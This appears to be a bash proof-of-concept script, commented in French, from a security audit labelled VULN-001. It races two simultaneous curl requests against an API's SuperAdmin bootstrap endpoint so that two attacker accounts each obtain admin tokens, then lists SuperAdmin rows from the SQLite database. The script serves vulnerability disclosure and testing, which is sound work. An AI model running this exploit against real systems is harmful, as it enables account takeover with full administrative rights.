#!/usr/bin/env bash
# VULN-001 — PoC : prise de contrôle du bootstrap SuperAdmin (course entre deux requêtes)
#
# Usage : ./audit/VULN-001-bootstrap-superadmin/poc.sh [BASE_URL] [FICHIER_SQLITE]
#   BASE_URL        API visée (défaut : http://localhost:3002)
#   FICHIER_SQLITE  base de l'API, pour compter les SuperAdmins créés (optionnel)
#
# À lancer UNIQUEMENT sur une base vide de test, jamais sur une vraie base.

BASE_URL="${1:-http://localhost:3002}"
DB="${2:-}"

echo "=== Cible : $BASE_URL/auth/super-admin"
echo "=== Deux attaquants envoient leur requête au même moment"
echo

for who in attaquant1 attaquant2; do
  curl -s -o "/tmp/vuln001-$who.json" -w "$who -> HTTP %{http_code}\n" \
    -X POST "$BASE_URL/auth/super-admin" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$who@evil.test\",\"password\":\"Password123!\"}" &
done
wait

echo
for who in attaquant1 attaquant2; do
  echo "--- Réponse reçue par $who :"
  # Les tokens sont tronqués à l'affichage, ils restent utilisables par l'attaquant
  sed -E 's/"(accessToken|refreshToken)":"([^"]{20})[^"]*"/"\1":"\2..."/g' "/tmp/vuln001-$who.json"
  echo
done

if [ -n "$DB" ]; then
  echo
  echo "=== Comptes SuperAdmin présents en base :"
  sqlite3 "$DB" "SELECT u.id, u.email FROM User u JOIN Role r ON r.id = u.roleId WHERE r.name = 'SuperAdmin';"
fi

rm -f /tmp/vuln001-attaquant1.json /tmp/vuln001-attaquant2.json
